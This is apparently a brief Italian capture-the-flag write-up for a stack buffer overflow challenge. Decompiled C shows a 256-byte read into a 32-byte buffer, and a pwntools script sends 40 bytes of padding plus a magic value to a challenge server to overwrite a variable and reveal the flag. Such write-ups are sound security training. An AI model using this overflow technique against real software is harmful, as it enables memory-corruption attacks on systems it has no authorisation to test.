# Enterprise encryption

```c
  local_20 = 0;
  puts("Hello, what\'s your name?");
  sVar1 = read(0,local_48,256);
  local_48[(int)sVar1 + -1] = '\0';
  printf("Hello %s, ",local_48);
  if (local_20 == 0x5ab1bb0) {
    param1 = getenv("FLAG");
    printf("the flag is %s\n",param1);
  }
  else {
    puts("no flag for you >:(\n");
  }
```

devi cambiare il valore della variabile local_20 facendo buffer overflow, `char local_48 [32]` siccome c'è un buffer di 32 byte e in read c'è un buffer di 256, quindi con questo, cerco di calcolare quante A servono per fare buffer overflow provando

```py
from pwn import *

p = remote('lil-overflow.challs.olicyber.it', 34002)

payload = b''
payload += b'A'*40
#payload += p32(95099824)
payload += p64(0x5ab1bb0)


p.sendline(payload)
p.stream()
```

flag{}